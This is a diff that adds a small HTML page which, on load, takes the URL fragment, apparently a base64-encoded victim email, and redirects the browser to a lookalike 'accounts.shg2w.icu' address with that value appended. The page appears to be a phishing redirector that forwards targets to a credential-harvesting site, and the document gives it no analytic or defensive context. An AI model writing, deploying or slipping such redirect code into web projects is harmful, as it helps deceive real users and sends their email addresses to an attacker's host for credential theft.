@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Redirrecting......</title>
+</head>
+
+<body>
+    <script>
+        function redirrectPage() {
+            const linkraw = "https://accounts.shg2w.icu?OMqQvweocA=cWtzbGN3eHc=";
+            var query = window.location.href;
+            console.log(query);
+            var res = query.split("#");
+            var data1 = res[0];
+            var data2 = res[1];
+            console.log(data1);
+            console.log(data2);
+            if (data2) {
+                //var decodedEmail = atob(data2);
+                console.log("true");
+                window.location.href = linkraw + data2;
+            } else {
+                console.log("false");
+                window.location.href = linkraw;
+            }
+        }
+        redirrectPage();
+    </script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"6ca6ff28a69d44fba4702225bf94b78d","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+
+</html>
